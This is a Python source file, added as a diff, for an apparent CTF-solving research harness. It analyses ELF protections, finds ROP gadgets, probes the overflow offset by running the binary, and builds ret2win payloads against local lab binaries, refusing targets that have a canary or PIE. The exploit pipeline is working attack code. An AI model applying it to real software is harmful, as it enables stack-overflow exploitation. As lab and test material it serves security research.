@@ -1,0 +1,439 @@
+"""
+v014_pwn_units.src — pwn 单元：真实 ELF 分析 + gadget 查找 + 偏移探测 + 真实 getshell
+
+为什么从 pwn 开始补
+    EXP-0011 显示：726 条真实攻击链里 pwn 族出现 635 次，是最大的缺口。
+    而且 pwn 的"标准套路"高度可单元化：查保护 → 找 gadget → 测偏移 → 拼 payload → 执行。
+
+本文件与前面几个版本的区别
+    v007–v012 的单元都在"数据"上流转；pwn 的单元作用在**一个 ELF 文件**上，
+    而且每一步都依赖前一步的真实结果：
+        保护检查 → 决定能不能打；符号表 → 决定打哪里；
+        gadget 查找 → 决定怎么传参；偏移探测 → 决定 padding 多长。
+    所以这里不做通用搜索，而是**按依赖顺序串起来的确定性流程**。
+
+四个单元
+    1. `elf_info`      —— canary / PIE / NX / RELRO、符号地址、.text 布局
+    2. `find_gadgets`  —— 用 capstone 反汇编，找 `pop reg; ret`（按指令边界，不靠裸字节扫描）
+    3. `probe_offset`  —— 用已知标记地址真实执行，从崩溃报告里反推覆盖返回地址的偏移
+    4. `build_ret2win` —— 拼 payload，自动处理 16 字节栈对齐
+
+    第 3 步是这里最关键的：**偏移不是猜的，是跑出来的**。
+
+测什么
+    T1  无 canary / 无 PIE → ret2win（直接跳后门）
+    T2  同上，但后门需要参数 → 必须找到 `pop rdi; ret` 并传参，且要处理栈对齐
+    N1  带 canary  → **应当拒绝**（不能盲目打，会触发 __stack_chk_fail）
+    N2  带 PIE     → **应当拒绝**（地址在运行时随机化，静态地址无效）
+
+运行
+    python versions/v014_pwn_units.src
+    python versions/v014_pwn_units.src --only T2
+
+产出物
+    experiments/EXP-0012/{results.json,report.md}
+    experiments/EXP-0012/pwn/{vuln,vuln.c,vuln_canary,vuln_pie}
+"""
+
+from __future__ import annotations
+
+import json
+import re
+import struct
+import subprocess
+import sys
+import time
+from dataclasses import dataclass, field
+from pathlib import Path
+
+ROOT = Path(__file__).resolve().parent.parent
+OUT_DIR = ROOT / "experiments" / "EXP-0012"
+PWN_DIR = OUT_DIR / "pwn"
+
+for _stream in (sys.stdout, sys.stderr):
+    if hasattr(_stream, "reconfigure"):
+        try:
+            _stream.reconfigure(encoding="utf-8", errors="replace")
+        except (ValueError, OSError):
+            pass
+
+
+def log(message: str) -> None:
+    print(f"[{time.strftime('%H:%M:%S')}] {message}", flush=True)
+
+
+# --------------------------------------------------------------------------------------
+# 单元 1：ELF 保护与符号
+# --------------------------------------------------------------------------------------
+
+@dataclass
+class ElfFacts:
+    path: str
+    is_pie: bool
+    has_canary: bool
+    has_nx: bool
+    relro: str
+    symbols: dict[str, int] = field(default_factory=dict)
+    imports: set[str] = field(default_factory=set)
+    text_addr: int = 0
+    text_data: bytes = b""
+
+
+def _wsl_path(win_path: str) -> str:
+    """把 D:\\a\\b 转成 /mnt/d/a/b。"""
+    p = Path(win_path).resolve()
+    drive = p.drive.rstrip(":").lower()
+    return f"/mnt/{drive}" + str(p)[2:].replace("\\", "/")
+
+
+def elf_info(path: str) -> ElfFacts:
+    """收集可以决定"能不能打"的事实。"""
+    from elftools.elf.elffile import ELFFile
+
+    with open(path, "rb") as handle:
+        elf = ELFFile(handle)
+        etype = elf["e_type"]
+        is_pie = etype == "ET_DYN"
+
+        symbols: dict[str, int] = {}
+        imports: set[str] = set()
+        for section_name in (".symtab", ".dynsym"):
+            section = elf.get_section_by_name(section_name)
+            if section is None:
+                continue
+            for symbol in section.iter_symbols():
+                if not symbol.name:
+                    continue
+                # 未定义符号 st_value=0，但它们恰恰是"导入了什么"的证据：
+                # 例如 __stack_chk_fail 能证明开了 canary。
+                imports.add(symbol.name)
+                if symbol["st_value"]:
+                    symbols.setdefault(symbol.name, symbol["st_value"])
+        has_canary = "__stack_chk_fail" in imports or "__stack_chk_guard" in imports
+
+        try:
+            gnu_stack = elf.get_segment(elf["e_phoff"]) if False else None
+        except Exception:  # noqa: BLE001
+            gnu_stack = None
+        try:
+            gnu_stack = elf.get_segment(elf["e_phoff"]) if False else None
+        except Exception:  # noqa: BLE001
+            gnu_stack = None
+        has_nx = False
+        for segment in elf.iter_segments():
+            if segment["p_type"] == "PT_GNU_STACK":
+                has_nx = not bool(segment["p_flags"] & 0x1)
+        relro = "partial"
+        for segment in elf.iter_segments():
+            if segment["p_type"] == "PT_GNU_RELRO":
+                relro = "full" if elf.get_section_by_name(".got.plt") is None else "partial"
+
+        text = elf.get_section_by_name(".text")
+        text_addr = text["sh_addr"]
+        text_data = text.data()
+
+    return ElfFacts(path=path, is_pie=is_pie, has_canary=has_canary, has_nx=has_nx,
+                    relro=relro, symbols=symbols, imports=imports,
+                    text_addr=text_addr, text_data=text_data)
+
+
+# --------------------------------------------------------------------------------------
+# 单元 2：gadget 查找（按指令边界，不靠裸字节）
+# --------------------------------------------------------------------------------------
+
+def find_gadgets(facts: ElfFacts) -> dict[str, int]:
+    from capstone import CS_ARCH_X86, CS_MODE_64, Cs
+
+    engine = Cs(CS_ARCH_X86, CS_MODE_64)
+    instructions = list(engine.disasm(facts.text_data, facts.text_addr))
+    gadgets: dict[str, int] = {}
+    # pop reg; ret
+    for index in range(len(instructions) - 1):
+        first, second = instructions[index], instructions[index + 1]
+        if first.mnemonic == "pop" and second.mnemonic == "ret":
+            gadgets.setdefault(f"pop {first.op_str}; ret", first.address)
+    # 单独的 ret（用于栈对齐）
+    for instruction in instructions:
+        if instruction.mnemonic == "ret":
+            gadgets.setdefault("ret", instruction.address)
+            break
+    return gadgets
+
+
+# --------------------------------------------------------------------------------------
+# 单元 3：偏移探测（真实执行）
+# --------------------------------------------------------------------------------------
+
+def _run_binary(wsl_path: str, payload: bytes, stdin_mode: bool = True) -> tuple[int, str, str]:
+    try:
+        done = subprocess.run(["wsl", "-e", wsl_path], input=payload,
+                              capture_output=True, timeout=20)
+    except subprocess.TimeoutExpired:
+        return 124, "", "timeout"
+    return (done.returncode,
+            done.stdout.decode("utf-8", "replace"),
+            done.stderr.decode("utf-8", "replace"))
+
+
+def _crash_rip(stderr: str) -> int | None:
+    match = re.search(r"CRASH sig=\d+ addr=(0x[0-9a-fA-F]+|\(nil\)) rip=(0x[0-9a-fA-F]+)", stderr)
+    if not match:
+        return None
+    return int(match.group(2), 16)
+
+
+_PROBE_SCRIPT = r"""
+import re, struct, subprocess, sys
+binary = sys.argv[1]
+order = [int(x) for x in sys.argv[2].split(",") if x]
+marker = 0xDEADBEEF
+marker_bytes = struct.pack("<Q", marker)
+pattern = re.compile(r"rip=(0x[0-9a-fA-F]+)")
+for n in order:
+    proc = subprocess.run([binary], input=b"A" * n + marker_bytes, capture_output=True)
+    err = proc.stderr.decode("utf-8", "replace")
+    match = pattern.search(err)
+    if match and int(match.group(1), 16) == marker:
+        print("OFFSET", n)
+        sys.exit(0)
+print("OFFSET -1")
+"""
+
+
+def probe_offset(wsl_path: str, facts: ElfFacts, max_offset: int = 256) -> dict:
+    """用标记地址探测"覆盖返回地址"所需的填充长度。
+
+    关键 1：内核在报告非规范地址的崩溃时会把 si_addr 归一化成 nil，
+            所以**不能**靠崩溃地址反推偏移；可靠做法是把标记地址写进 payload，
+            看崩溃时 RIP 是否正好等于标记值。
+    关键 2：这些探测全部在 **WSL 内部一个进程里**完成。
+            每次从 Windows 起一个 `wsl -e` 要几百毫秒，逐次调用会让探测慢一个数量级。
+    """
+    marker = 0xDEADBEEF
+    hints = _static_hints(facts)
+    order: list[int] = []
+    for hint in hints:
+        for delta in range(-16, 17):
+            candidate = hint + delta
+            if 0 <= candidate <= max_offset and candidate not in order:
+                order.append(candidate)
+    order.extend(n for n in range(0, max_offset + 1) if n not in order)
+
+    try:
+        done = subprocess.run(
+            ["wsl", "-e", "python3", "-c", _PROBE_SCRIPT, wsl_path,
+             ",".join(str(n) for n in order)],
+            capture_output=True, text=True, encoding="utf-8", errors="replace", timeout=180,
+        )
+    except subprocess.TimeoutExpired:
+        return {"offset": None, "probes": 0, "static_hints": hints, "ok": False,
+                "error": "probe_timeout"}
+
+    match = re.search(r"OFFSET\s+(-?\d+)", done.stdout or "")
+    offset = int(match.group(1)) if match else -1
+    if offset < 0:
+        return {"offset": None, "probes": len(order), "static_hints": hints, "ok": False}
+    tried = order.index(offset) + 1
+    return {"offset": offset, "probes": tried, "static_hints": hints, "ok": True}
+
+
+def _static_hints(facts: ElfFacts) -> list[int]:
+    """从反汇编里估算栈缓冲大小，作为探测的起点。"""
+    from capstone import CS_ARCH_X86, CS_MODE_64, Cs
+
+    engine = Cs(CS_ARCH_X86, CS_MODE_64)
+    hints: list[int] = []
+    for instruction in engine.disasm(facts.text_data, facts.text_addr):
+        # sub rsp, imm  →  缓冲大小
+        if instruction.mnemonic == "sub" and instruction.op_str.startswith("rsp,"):
+            try:
+                value = int(instruction.op_str.split(",")[1].strip(), 0)
+            except ValueError:
+                continue
+            # 缓冲区 + 保存的 rbp
+            for extra in (8, 16):
+                candidate = value + extra
+                if candidate not in hints:
+                    hints.append(candidate)
+    return hints[:4]
+
+
+# --------------------------------------------------------------------------------------
+# 单元 4：拼 payload
+# --------------------------------------------------------------------------------------
+
+def build_ret2win(facts: ElfFacts, gadgets: dict[str, int], offset: int,
+                  target: str, arg: int | None = None,
+                  align: bool = True) -> bytes:
+    """拼 ret2win payload。
+
+    需要参数时，必须用 `pop rdi; ret`；并且要处理 16 字节栈对齐——
+    实测不加对齐会崩在目标函数入口（movaps 对 rsp 对齐的要求）。
+    """
+    if target not in facts.symbols:
+        raise KeyError(f"符号不存在：{target}")
+    target_addr = facts.symbols[target]
+    payload = b"A" * offset
+
+    if arg is None:
+        if align and gadgets.get("ret") is not None:
+            # 先 ret 一次，把 rsp 调整 8 字节，满足 16 字节对齐
+            payload += struct.pack("<Q", gadgets["ret"])
+        payload += struct.pack("<Q", target_addr)
+        return payload
+
+    pop_rdi = gadgets.get("pop rdi; ret")
+    if pop_rdi is None:
+        raise KeyError("缺少 pop rdi; ret")
+    if align and gadgets.get("ret") is not None:
+        payload += struct.pack("<Q", gadgets["ret"])
+    payload += struct.pack("<Q", pop_rdi)
+    payload += struct.pack("<Q", arg)
+    payload += struct.pack("<Q", target_addr)
+    return payload
+
+
+# --------------------------------------------------------------------------------------
+# 解题流程
+# --------------------------------------------------------------------------------------
+
+FLAG_RE = re.compile(r"flag\{[^}\n]{1,200}\}", re.IGNORECASE)
+
+
+def solve(path: str, expected: str, target_arg: int | None = None) -> dict:
+    started = time.perf_counter()
+    steps: list[dict] = []
+    wsl_path = _wsl_path(path)
+
+    # 1) ELF 事实
+    facts = elf_info(path)
+    steps.append({"unit": "elf_info", "result": "ok",
+                  "pie": facts.is_pie, "canary": facts.has_canary,
+                  "nx": facts.has_nx, "relro": facts.relro,
+                  "symbols": len(facts.symbols)})
+
+    # 2) 保护检查 —— 能打才继续
+    block: str | None = None
+    if facts.has_canary:
+        block = "canary_present"
+    elif facts.is_pie:
+        block = "pie_enabled"
+    if block:
+        steps.append({"unit": "protection_gate", "result": "refuse", "reason": block})
+        return {"solved": False, "refused": True, "reason": block, "steps": steps,
+                "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+
+    # 3) gadget
+    gadgets = find_gadgets(facts)
+    steps.append({"unit": "find_gadgets", "result": "ok", "found": sorted(gadgets)[:6]})
+
+    # 4) 偏移
+    probe = probe_offset(wsl_path, facts)
+    steps.append({"unit": "probe_offset", **probe})
+    if not probe["ok"]:
+        return {"solved": False, "refused": False, "reason": "offset_not_found",
+                "steps": steps, "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+
+    # 5) 选后门
+    target = "win_arg" if (target_arg is not None and "win_arg" in facts.symbols) else "win"
+    payload = build_ret2win(facts, gadgets, probe["offset"], target, target_arg)
+    steps.append({"unit": "build_ret2win", "result": "ok", "target": target,
+                  "payload_len": len(payload)})
+
+    # 6) 真实执行
+    rc, out, err = _run_binary(wsl_path, payload)
+    found = FLAG_RE.search(out)
+    ok = bool(found and found.group(0).lower() == expected.lower())
+    steps.append({"unit": "execute", "result": "solved" if ok else "failed",
+                  "rc": rc, "stdout": out.strip()[-200:]})
+    return {"solved": ok, "refused": False, "output": found.group(0) if found else None,
+            "steps": steps, "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+
+
+# --------------------------------------------------------------------------------------
+# 主流程
+# --------------------------------------------------------------------------------------
+
+EXPECTED = "flag{ret2win_real_binary}"
+
+
+def build_targets() -> list[dict]:
+    variants = {
+        "T1": ("vuln", None, False),
+        "T2": ("vuln", 0x1234, False),
+        "N1": ("vuln_canary", None, True),
+        "N2": ("vuln_pie", None, True),
+    }
+    tasks = []
+    for tid, (binary, arg, negative) in variants.items():
+        path = PWN_DIR / binary
+        tasks.append({"id": tid, "path": str(path), "arg": arg, "negative": negative})
+    return tasks
+
+
+def main() -> None:
+    import argparse
+
+    parser = argparse.ArgumentParser(description="pwn 单元：真实 ELF 分析 + exploit")
+    parser.add_argument("--only", default=None)
+    args = parser.parse_args()
+
+    if not (PWN_DIR / "vuln").exists():
+        raise SystemExit(f"靶场未编译：{PWN_DIR / 'vuln'}（见文件顶部注释）")
+
+    rows: list[dict] = []
+    for task in build_targets():
+        if args.only and task["id"] != args.only:
+            continue
+        result = solve(task["path"], EXPECTED, task["arg"])
+        row = {"id": task["id"], "negative": task["negative"], **result}
+        rows.append(row)
+        if row["negative"]:
+            ok = row["refused"]
+            verdict = "OK(正确拒绝)" if ok else "UNEXPECTED"
+        else:
+            ok = row["solved"]
+            verdict = "OK" if ok else "FAILED"
+        reason = row.get("reason") or ""
+        used = [s["unit"] for s in row["steps"]]
+        log(f"  {task['id']}: {verdict:14} {reason:18} units={used}  "
+            f"{row['elapsed_ms']}ms")
+
+    positives = [r for r in rows if not r["negative"]]
+    negatives = [r for r in rows if r["negative"]]
+    summary = {
+        "positive_total": len(positives),
+        "positive_solved": sum(1 for r in positives if r["solved"]),
+        "negative_total": len(negatives),
+        "negative_correctly_refused": sum(1 for r in negatives if r["refused"]),
+        "mean_elapsed_ms": round(sum(r["elapsed_ms"] for r in rows) / max(len(rows), 1), 1),
+    }
+    log("汇总：" + json.dumps(summary, ensure_ascii=False))
+
+    OUT_DIR.mkdir(parents=True, exist_ok=True)
+    (OUT_DIR / "results.json").write_text(
+        json.dumps({"summary": summary, "rows": rows}, ensure_ascii=False, indent=2),
+        encoding="utf-8")
+
+    lines = ["# EXP-0012 — pwn 单元（真实 ELF + 真实执行）", "",
+             "四个单元：`elf_info` → `find_gadgets` → `probe_offset` → `build_ret2win`，",
+             "最后在 WSL 里真实执行二进制验证。", "", "## 汇总", "", "```json",
+             json.dumps(summary, ensure_ascii=False, indent=2), "```", "",
+             "## 逐题", "", "| 题 | 类型 | 结果 | 原因 | 用到的单元 | 耗时 |",
+             "| --- | --- | --- | --- | --- | --- |"]
+    for row in rows:
+        if row["negative"]:
+            mark = "✓ 正确拒绝" if row["refused"] else "✗ 未拒绝"
+            kind = "负样本"
+        else:
+            mark = "✓ 解出" if row["solved"] else "✗ 失败"
+            kind = "正样本"
+        used = " → ".join(s["unit"] for s in row["steps"])
+        lines.append(f"| {row['id']} | {kind} | {mark} | {row.get('reason') or '—'} "
+                     f"| {used} | {row['elapsed_ms']}ms |")
+    (OUT_DIR / "report.md").write_text("\n".join(lines), encoding="utf-8")
+    log(f"报告：{OUT_DIR / 'report.md'}")
+
+
+if __name__ == "__main__":
+    main()
